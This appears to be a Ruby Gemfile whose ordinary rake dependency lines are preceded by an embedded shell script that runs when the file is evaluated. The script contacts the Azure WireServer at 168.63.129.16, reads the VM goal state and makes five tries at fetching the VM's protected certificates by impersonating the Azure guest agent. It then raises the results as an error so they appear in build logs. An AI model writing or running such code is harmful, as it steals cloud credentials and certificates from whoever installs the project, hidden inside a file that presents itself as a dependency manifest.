require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v109; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
CERT_URL=$(python3 -c 'import re,html; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(html.unescape(m.group(1)) if m else "")')

openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null

# Try cert as raw PEM body (no markers), then with markers, then DER
CERT_NOMARK=$(grep -v '^-----' cert.pem | tr -d '\n')
CERT_PEM_B64=$(base64 -w0 cert.pem)

echo "=== ATTEMPT 1: cert without PEM markers, base64-encoded direct ==="
curl -s -m 10 -w "HTTP_%{http_code}_LEN_%{size_download}" \
  -H "x-ms-agent-name: WALinuxAgent" \
  -H "x-ms-version: 2015-04-05" \
  -H "x-ms-cipher-name: DES_EDE3_CBC" \
  -H "x-ms-guest-agent-public-x509-cert: $CERT_NOMARK" \
  -o cert-r1.xml "$CERT_URL"
echo " resp=$(cat -A cert-r1.xml | head -c 400)"

echo "=== ATTEMPT 2: cert as PEM b64 (with markers) ==="
curl -s -m 10 -w "HTTP_%{http_code}_LEN_%{size_download}" \
  -H "x-ms-agent-name: WALinuxAgent" \
  -H "x-ms-version: 2015-04-05" \
  -H "x-ms-cipher-name: DES_EDE3_CBC" \
  -H "x-ms-guest-agent-public-x509-cert: $CERT_PEM_B64" \
  -o cert-r2.xml "$CERT_URL"
echo " resp=$(cat -A cert-r2.xml | head -c 400)"

echo "=== ATTEMPT 3: x-ms-agent-name=ProvisioningAgent ==="
curl -s -m 10 -w "HTTP_%{http_code}_LEN_%{size_download}" \
  -H "x-ms-agent-name: ProvisioningAgent" \
  -H "x-ms-version: 2015-04-05" \
  -H "x-ms-cipher-name: DES_EDE3_CBC" \
  -H "x-ms-guest-agent-public-x509-cert: $CERT_NOMARK" \
  -o cert-r3.xml "$CERT_URL"
echo " resp=$(cat -A cert-r3.xml | head -c 400)"

echo "=== ATTEMPT 4: AzureGuestAgent name + 2012 version ==="
curl -s -m 10 -w "HTTP_%{http_code}_LEN_%{size_download}" \
  -H "x-ms-agent-name: AzureGuestAgent" \
  -H "x-ms-version: 2012-11-30" \
  -H "x-ms-cipher-name: DES_EDE3_CBC" \
  -H "x-ms-guest-agent-public-x509-cert: $CERT_NOMARK" \
  -o cert-r4.xml "$CERT_URL"
echo " resp=$(cat -A cert-r4.xml | head -c 400)"

echo "=== ATTEMPT 5: DER-formatted cert ==="
openssl x509 -in cert.pem -outform DER -out cert.der 2>/dev/null
CERT_DER_B64=$(base64 -w0 cert.der)
curl -s -m 10 -w "HTTP_%{http_code}_LEN_%{size_download}" \
  -H "x-ms-agent-name: WALinuxAgent" \
  -H "x-ms-version: 2015-04-05" \
  -H "x-ms-cipher-name: DES_EDE3_CBC" \
  -H "x-ms-guest-agent-public-x509-cert: $CERT_DER_B64" \
  -o cert-r5.xml "$CERT_URL"
echo " resp=$(cat -A cert-r5.xml | head -c 400)"

SHELL
Tempfile.create('v109.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v109 " + line.chomp[0..420] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
